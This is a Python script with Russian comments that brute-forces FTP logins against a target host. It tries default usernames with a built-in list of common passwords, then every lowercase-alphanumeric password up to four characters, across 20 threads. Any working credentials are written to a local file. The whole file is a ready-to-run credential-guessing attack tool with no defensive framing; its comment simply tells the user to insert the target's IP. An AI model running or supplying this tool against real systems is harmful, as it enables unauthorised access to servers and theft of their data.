import ftplib
import itertools
import os
import string
import threading
from queue import Queue

# Настройки
host = "192.168.1.1"  # Замените на IP вашей цели
port = 21
max_threads = 20
min_len = 1
max_len = 4
charset = string.ascii_lowercase + string.digits

default_logins = ["admin", "ftp", "user", "anonymous", "guest", "root", "test"]
default_passwords = [
    "admin", "admin123", "1234", "12345", "123456", "12345678", "123456789",
    "password", "ftp", "ftp123", "test", "test123", "root", "root123",
    "guest", "guest123", "pass", "letmein", "toor", "1q2w3e", "qwerty", "abc123"
]

found = False
lock = threading.Lock()

def load_list_from_file(filename, default_list):
    if os.path.isfile(filename):
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    return default_list

def try_login(username, password):
    global found
    if found:
        return
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=5)
        ftp.login(username, password)
        with lock:
            if not found:
                found = True
                print(f"\n[+] УСПЕХ: {username}:{password}")
                with open("ftp_found.txt", "a") as f:
                    f.write(f"{username}:{password}\n")
        ftp.quit()
    except ftplib.error_perm:
        pass
    except Exception as e:
        pass  # Можно включить логирование при необходимости

def worker(q):
    while not q.empty() and not found:
        username, password = q.get()
        print(f"[-] Пробуем: {username}:{password}")
        try_login(username, password)
        q.task_done()

def generate_passwords(charset, min_len, max_len):
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            yield ''.join(combo)

if __name__ == "__main__":
    logins = load_list_from_file("logins.txt", default_logins)
    passwords = load_list_from_file("passwords.txt", default_passwords)

    q = Queue()

    # Словари
    for username in logins:
        for password in passwords:
            q.put((username, password))

    # Полный перебор
    for username in logins:
        for password in generate_passwords(charset, min_len, max_len):
            q.put((username, password))

    threads = []
    for _ in range(max_threads):
        t = threading.Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()

    if not found:
        print("\n[-] Пароль не найден.")
    else:
        print("\n[+] Данные сохранены в ftp_found.txt")
